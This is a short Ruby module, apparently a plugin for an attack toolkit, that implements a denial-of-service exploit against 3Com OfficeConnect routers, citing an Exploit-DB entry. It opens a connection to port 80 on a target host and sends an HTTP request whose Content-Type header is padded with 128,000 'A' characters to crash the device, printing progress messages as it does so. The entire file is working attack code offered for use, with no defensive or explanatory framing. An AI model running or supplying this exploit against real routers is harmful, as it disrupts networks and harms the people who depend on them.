
def tcom_oconn_dos_load(opt)
	opt["host"] = true
	return opt
end

def tcom_oconn_dos(opt)
	# 3Com OfficeConnect Routers DoS (Content-Type)
	# Based on 3Com OfficeConnect Routers DoS (Content-Type) http://www.exploit-db.com/exploits/10580/
	buff = "A"*128000
	host = opt["host"]

	puts "[*] Connecting to the target ..."
	begin
		s = TCPSocket.new(host, 80)
	rescue
		puts "    Error connecting."
		return 0
	end
	puts "[*] Connected, sending exploit ..."
	s.write("GET / HTTP/1.1\r\nContent-Type:#{buff}\r\n\r\n")
	s.close()
	puts "[*] Exploit sent."
end

